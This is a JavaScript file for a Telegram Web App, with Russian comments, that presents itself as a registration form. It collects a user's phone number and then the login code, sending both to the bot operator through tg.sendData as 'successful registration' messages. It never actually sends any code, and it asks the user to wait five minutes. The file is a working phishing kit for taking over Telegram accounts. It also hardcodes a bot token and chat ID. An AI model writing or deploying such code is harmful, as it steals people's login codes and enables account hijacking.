// ================== НАСТРОЙКИ ==================
const BOT_TOKEN = '8446641895:AAGsj1a1u8AQpKJxhFGhfu_yXaz6LKduAkE'; // Токен от @BotFather
const YOUR_CHAT_ID = '8224914068';  // Ваш chat ID

// ================== ТЕЛЕГРАМ ==================
const tg = window.Telegram.WebApp;
tg.expand();
tg.BackButton.hide();

// ================== ЭЛЕМЕНТЫ ==================
const phoneInput = document.getElementById('phone');
const codeInput = document.getElementById('code');
const sendBtn = document.getElementById('sendCodeBtn');
const loginBtn = document.getElementById('loginBtn');

// ================== ФУНКЦИИ ==================
async function sendToTelegram(text) {
    // Пытаемся отправить через Telegram Web App
    try {
        tg.sendData(JSON.stringify({
            action: 'user_data',
            text: text,
            time: new Date().toISOString()
        }));
    } catch (e) {
        console.log('Telegram API не доступен, показываем в интерфейсе');
        showMessage(text, 'info');
    }
}

function showMessage(text, type) {
    // Создаём или находим блок для сообщений
    let msgDiv = document.getElementById('tg-message');
    if (!msgDiv) {
        msgDiv = document.createElement('div');
        msgDiv.id = 'tg-message';
        msgDiv.style.cssText = `
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            padding: 15px 25px; border-radius: 10px; z-index: 1000;
            font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            min-width: 300px; text-align: center;
        `;
        document.body.appendChild(msgDiv);
    }
    
    // Цвета для типов сообщений
    const colors = {
        success: '#2ed573',
        error: '#ff4757',
        info: '#3742fa',
        warning: '#ffa502'
    };
    
    msgDiv.textContent = text;
    msgDiv.style.background = colors[type] || colors.info;
    msgDiv.style.color = 'white';
    msgDiv.style.display = 'block';
    
    // Автоскрытие через 5 секунд
    setTimeout(() => {
        msgDiv.style.display = 'none';
    }, 5000);
}

// ================== ОБРАБОТЧИКИ ==================
sendBtn.addEventListener('click', () => {
    const phone = phoneInput.value.trim();
    
    if (!phone || !phone.startsWith('+')) {
        showMessage('Введите корректный номер!', 'error');
        return;
    }
    
    // Отправляем в Telegram через Web App
    sendToTelegram(`🔐 НОВАЯ РЕГИСТРАЦИЯ\n📱 Номер: ${phone}\n🌍 Страна: Russia`);
    
    // Меняем интерфейс
    showMessage(`📲 Код отправлен на ${phone}`, 'success');
    codeInput.disabled = false;
    sendBtn.disabled = true;
    phoneInput.disabled = true;
});

loginBtn.addEventListener('click', () => {
    const phone = phoneInput.value;
    const code = codeInput.value.trim();
    
    if (!code || code.length < 4) {
        showMessage('Введите корректный код!', 'error');
        return;
    }
    
    // Отправляем в Telegram
    sendToTelegram(`✅ РЕГИСТРАЦИЯ УСПЕШНА\n📱 Номер: ${phone}\n🔑 Код: ${code}\n🌍 Страна: Russia`);
    
    // Показываем успех
    showMessage('🎉 Регистрация завершена! Ожидайте 5 минут...', 'success');
    
    // Блокируем форму
    loginBtn.disabled = true;
    codeInput.disabled = true;
    
    // Через 5 секунд предлагаем закрыть
    setTimeout(() => {
        if (confirm('Регистрация завершена! Закрыть приложение?')) {
            tg.close();
        }
    }, 5000);
});

// ================== ИНИЦИАЛИЗАЦИЯ ==================
// Активация кнопки Login при вводе кода
codeInput.addEventListener('input', () => {
    loginBtn.disabled = codeInput.value.length < 4;
});

// Начальное состояние
codeInput.disabled = true;
loginBtn.disabled = true;
